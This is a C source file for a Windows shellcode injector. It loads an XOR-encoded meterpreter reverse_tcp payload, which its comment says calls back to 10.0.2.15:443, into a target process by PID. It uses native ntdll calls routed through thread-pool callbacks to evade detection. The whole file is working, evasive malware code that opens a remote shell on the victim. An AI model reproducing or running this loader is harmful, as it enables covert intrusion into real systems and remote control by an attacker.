#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID(NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID(NTAPI* TPRELEASEWORK)(PTP_WORK);

#define InitializeObjectAttributes(p,n,a,r,s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
  (p)->RootDirectory = (r); \
  (p)->Attributes = (a); \
  (p)->ObjectName = (n); \
  (p)->SecurityDescriptor = (s); \
  (p)->SecurityQualityOfService = NULL; \
}

// dt nt!_UNICODE_STRING
typedef struct _LSA_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;


typedef struct _NTOPENPROCESSMEMORY_ARGS {
    UINT_PTR pNtOpenProcess;   // pointer to NtOpenProcess - rax
    PHANDLE hProcess;           // HANDLE ProcessHandle - rcx
    ACCESS_MASK AccessMask;    // Access mask - rdx
    POBJECT_ATTRIBUTES oa;     // POBJECT_ATTRIBUTES r8
    PCLIENT_ID cid;            // PCLIENT_ID r9
} NTOPENPROCESSMEMORY_ARGS, * PNTOPENPROCESSMEMORY_ARGS;


typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, * PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *address - rdx
    PVOID* buffer;                       // PVOID *buffer - r8
    ULONG NumberOfBytesToWrite;          // ULONG NumberOfBytesToWrite  - r9
    PULONG NumberOfBytesWritten;         // PULONG NumberOfBytesWritten  - stack
} NTWRITEVIRTUALMEMORY_ARGS, * PNTWRITEVIRTUALMEMORY_ARGS;

typedef struct _NTPROTECTVIRTUALMEMORY_ARGS {
    UINT_PTR pNtProtectVirtualMemory;          // pointer to NtCreateThreadEx - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - r9
    PVOID* address;                      // PVOID *address - stack
    PULONG size;                        // PSIZE_T RegionSize - r9;
    ULONG NewProtect;                   // ULONG Protect
    PULONG OldProtect;                   // ULONG Protect
} NTPROTECTVIRTUALMEMORY_ARGS, * PNTPROTECTVIRTUALMEMORY_ARGS;

typedef struct _NTCREATETHREADEX_ARGS {
    UINT_PTR pNtCreateThreadEx;          // pointer to NtCreateThreadEx - rax
    HANDLE hThread;                     // HANDLE ProcessHandle - rcx
    HANDLE hProcess;                     // HANDLE ProcessHandle - r9
    PVOID* address;                      // PVOID *address - stack
} NTCREATETHREADEX_ARGS, * PNTCREATETHREADEX_ARGS;


extern VOID CALLBACK WorkCallback1(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
extern VOID CALLBACK WorkCallback2(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
extern VOID CALLBACK WorkCallback3(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
extern VOID CALLBACK WorkCallback4(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);


typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);
typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)(HANDLE ProcessHandle, BOOL Alertable, PLARGE_INTEGER Timeout);




// XOR-encoded payload.
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread -f c
unsigned char buf[] = "\x36\x82\x49\x2e\x3a\x22\x06\xca\xca\xca\x8b\x9b\x8b\x9a\x98\x82\xfb\x18\x9b\x9c\xaf\x82\x41\x98\xaa\x82\x41\x98\xd2\x82\x41\x98\xea\x82\x41\xb8\x9a\x87\xfb\x03\x82\xc5\x7d\x80\x80\x82\xfb\x0a\x66\xf6\xab\xb6\xc8\xe6\xea\x8b\x0b\x03\xc7\x8b\xcb\x0b\x28\x27\x98\x82\x41\x98\xea\x41\x88\xf6\x8b\x9b\x82\xcb\x1a\xac\x4b\xb2\xd2\xc1\xc8\xc5\x4f\xb8\xca\xca\xca\x41\x4a\x42\xca\xca\xca\x82\x4f\x0a\xbe\xad\x82\xcb\x1a\x9a\x8e\x41\x8a\xea\x83\xcb\x1a\x41\x82\xd2\x29\x9c\x82\x35\x03\x87\xfb\x03\x8b\x41\xfe\x42\x82\xcb\x1c\x82\xfb\x0a\x8b\x0b\x03\xc7\x66\x8b\xcb\x0b\xf2\x2a\xbf\x3b\x86\xc9\x86\xee\xc2\x8f\xf3\x1b\xbf\x12\x92\x8e\x41\x8a\xee\x83\xcb\x1a\xac\x8b\x41\xc6\x82\x8e\x41\x8a\xd6\x83\xcb\x1a\x8b\x41\xce\x42\x82\xcb\x1a\x8b\x92\x8b\x92\x94\x93\x90\x8b\x92\x8b\x93\x8b\x90\x82\x49\x26\xea\x8b\x98\x35\x2a\x92\x8b\x93\x90\x82\x41\xd8\x23\x81\x35\x35\x35\x97\x82\xfb\x11\x99\x83\x74\xbd\xa3\xa4\xa3\xa4\xaf\xbe\xca\x8b\x9c\x82\x43\x2b\x83\x0d\x08\x86\xbd\xec\xcd\x35\x1f\x99\x99\x82\x43\x2b\x99\x90\x87\xfb\x0a\x87\xfb\x03\x99\x99\x83\x70\xf0\x9c\xb3\x6d\xca\xca\xca\xca\x35\x1f\x22\xc0\xca\xca\xca\xfb\xfa\xe4\xfa\xe4\xf8\xe4\xfb\xff\xca\x90\x82\x43\x0b\x83\x0d\x0a\x71\xcb\xca\xca\x87\xfb\x03\x99\x99\xa0\xc9\x99\x83\x70\x9d\x43\x55\x0c\xca\xca\xca\xca\x35\x1f\x22\x88\xca\xca\xca\xe5\xa3\xa4\xae\xaf\xb2\xe4\xa2\xbe\xa7\xa6\xe5\xa0\x8b\x9a\xbf\x9a\x87\x84\x85\xbe\x9a\x80\x9c\x9e\xa6\x98\x87\x87\xfc\xad\xbb\x9d\xad\xa1\xad\xae\x90\xa5\x9a\x8d\xb0\xa9\xac\x8b\x9d\x9e\xfc\xba\xf9\x88\xb3\xa3\xf3\xac\xf9\xa3\xa3\x88\x87\xa7\x88\x99\xbf\xa0\xca\x82\x43\x0b\x99\x90\x8b\x92\x87\xfb\x03\x99\x82\x72\xca\xf8\x62\x4e\xca\xca\xca\xca\x9a\x99\x99\x83\x0d\x08\x21\x9f\xe4\xf1\x35\x1f\x82\x43\x0c\xa0\xc0\x95\x82\x43\x3b\xa0\xd5\x90\x98\xa2\x4a\xf9\xca\xca\x83\x43\x2a\xa0\xce\x8b\x93\x83\x70\xbf\x8c\x54\x4c\xca\xca\xca\xca\x35\x1f\x87\xfb\x0a\x99\x90\x82\x43\x3b\x87\xfb\x03\x87\xfb\x03\x99\x99\x83\x0d\x08\xe7\xcc\xd2\xb1\x35\x1f\x4f\x0a\xbf\xd5\x82\x0d\x0b\x42\xd9\xca\xca\x83\x70\x8e\x3a\xff\x2a\xca\xca\xca\xca\x35\x1f\x82\x35\x05\xbe\xc8\x21\x60\x22\x9f\xca\xca\xca\x99\x93\xa0\x8a\x90\x83\x43\x1b\x0b\x28\xda\x83\x0d\x0a\xca\xda\xca\xca\x83\x70\x92\x6e\x99\x2f\xca\xca\xca\xca\x35\x1f\x82\x59\x99\x99\x82\x43\x2d\x82\x43\x3b\x82\x43\x10\x83\x0d\x0a\xca\xea\xca\xca\x83\x43\x33\x83\x70\xd8\x5c\x43\x28\xca\xca\xca\xca\x35\x1f\x82\x49\x0e\xea\x4f\x0a\xbe\x78\xac\x41\xcd\x82\xcb\x09\x4f\x0a\xbf\x18\x92\x09\x92\xa0\xca\x93\x71\x2a\xd7\xe0\xc0\x8b\x43\x10\x35\x1f";


int main(int argc, char* argv[]) {

    printf("Define oa\n");
    OBJECT_ATTRIBUTES oa;
    printf("Initialize oa\n");
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    printf("Length of OBJECT_ATTRIBUTES: %lu\n", oa.Length);
    printf("Define cid\n");
    CLIENT_ID cid;
    DWORD pid = (DWORD)atoi(argv[1]);
    printf("PID: %i\n", pid);
    printf("Initialize cid\n");
    cid.UniqueProcess = (PVOID)pid;
    cid.UniqueThread = 0;
    ULONG bufSize = sizeof(buf);

    // loading ntdll.dll
    HMODULE hModuleNtdll = GetModuleHandleA("ntdll");
    pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(hModuleNtdll, "NtOpenProcess");
    pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)(GetProcAddress(hModuleNtdll, "NtAllocateVirtualMemory"));
    pNtWriteVirtualMemory myNtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hModuleNtdll, "NtWriteVirtualMemory");
    pNtCreateThreadEx myNtCreateThreadEx = (pNtCreateThreadEx)(GetProcAddress(hModuleNtdll, "NtCreateThreadEx"));
    pNtProtectVirtualMemory myNtProtectVirtualMemory = (pNtProtectVirtualMemory)(GetProcAddress(hModuleNtdll, "NtProtectVirtualMemory"));
    pNtWaitForSingleObject myNtWaitForSingleObject = (pNtWaitForSingleObject)(GetProcAddress(hModuleNtdll, "NtWaitForSingleObject"));
    FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpAllocWork");
    FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpPostWork");
    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpReleaseWork");
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID bufAdd = NULL;
    ULONG bytesWritten;


    printf("Opening handle\n");
    // Open handle to the target process
    //myNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid); 
    NTOPENPROCESSMEMORY_ARGS ntOpenProcessArgs = { 0 };
    ntOpenProcessArgs.pNtOpenProcess = (UINT_PTR)myNtOpenProcess;
    ntOpenProcessArgs.hProcess = &hProcess;
    ntOpenProcessArgs.AccessMask = PROCESS_ALL_ACCESS;
    ntOpenProcessArgs.oa = &oa;
    ntOpenProcessArgs.cid = &cid;
    PTP_WORK WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback1, &ntOpenProcessArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    WaitForSingleObject((HANDLE)-1, 0x1000);
    printf("hProcess: %p\n", hProcess);


    printf("Allocating memory\n");
    // Allocate virtual memory in the target process 
    //bufAdd = VirtualAllocEx(hProcess, NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //myNtAllocateVirtualMemory(hProcess, &bufAdd, 0, &bufSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_EXECUTE_READWRITE);
    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR)myNtAllocateVirtualMemory;
    ntAllocateVirtualMemoryArgs.hProcess = hProcess;
    ntAllocateVirtualMemoryArgs.address = &bufAdd;
    ntAllocateVirtualMemoryArgs.size = &bufSize;
    ntAllocateVirtualMemoryArgs.permissions = (ULONG)PAGE_READWRITE;
    WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback2, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    WaitForSingleObject((HANDLE)-1, 0x1000);
    printf("Base address: %p\n", bufAdd);
    printf("Size: %zu\n", bufSize);


    // XOR the buffer with 0xfa
    // sizeof(buf) - 1; // Exclude the null terminator
    for (size_t i = 0; i < sizeof(buf) - 1; i++) {
        buf[i] ^= 0xca;
    }


    printf("Writing memory\n");
    //WriteProcessMemory(hProcess, bufAdd, (PVOID)buf, bufSize - 1, (SIZE_T*)NULL);
    //myNtWriteVirtualMemory(hProcess, bufAdd, (PVOID)buf, sizeof(buf), &bytesWritten);
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR)myNtWriteVirtualMemory;
    ntWriteVirtualMemoryArgs.hProcess = hProcess;
    ntWriteVirtualMemoryArgs.address = bufAdd;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)buf;
    ntWriteVirtualMemoryArgs.NumberOfBytesToWrite = sizeof(buf);
    ntWriteVirtualMemoryArgs.NumberOfBytesWritten = &bytesWritten;
    WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback3, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    WaitForSingleObject((HANDLE)-1, 0x1000);
    printf("Bytes written: %d\n", bytesWritten);


    //VirtualProtect - we can use WorkCallback3
    ULONG OldProtect = NULL;
    printf("Changing memory protection\n");
    //myNtProtectVirtualMemory(hProcess, &bufAdd, &bufSize, (ULONG)PAGE_EXECUTE_READ, &OldProtect);
    NTPROTECTVIRTUALMEMORY_ARGS ntProtectVirtualMemoryArgs = { 0 };
    ntProtectVirtualMemoryArgs.pNtProtectVirtualMemory = (UINT_PTR)myNtProtectVirtualMemory;
    ntProtectVirtualMemoryArgs.hProcess = hProcess;
    ntProtectVirtualMemoryArgs.address = &bufAdd;
    ntProtectVirtualMemoryArgs.size = &bufSize;
    ntProtectVirtualMemoryArgs.NewProtect = (ULONG)PAGE_EXECUTE_READ;
    ntProtectVirtualMemoryArgs.OldProtect = &OldProtect;
    WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback3, &ntProtectVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    WaitForSingleObject((HANDLE)-1, 0x1000);
    printf("Protection changed from: %lu\n", OldProtect);


    printf("Creating thread\n");
    // Create a thread
    //hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)bufAdd, NULL, 0, NULL);
    //myNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)bufAdd, NULL, FALSE, 0, 0, 0, NULL);
    NTCREATETHREADEX_ARGS ntCreateThreadExArgs = { 0 };
    ntCreateThreadExArgs.pNtCreateThreadEx = (UINT_PTR)myNtCreateThreadEx;
    ntCreateThreadExArgs.hThread = &hThread;
    ntCreateThreadExArgs.hProcess = hProcess;
    ntCreateThreadExArgs.address = (LPTHREAD_START_ROUTINE)bufAdd;
    WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback4, &ntCreateThreadExArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    WaitForSingleObject(ntCreateThreadExArgs.hProcess, 0x1000);
    hThread = ntCreateThreadExArgs.hThread;
    printf("hThread: %p\n", hThread);

    myNtWaitForSingleObject(hThread, FALSE, NULL);
    return 0;

}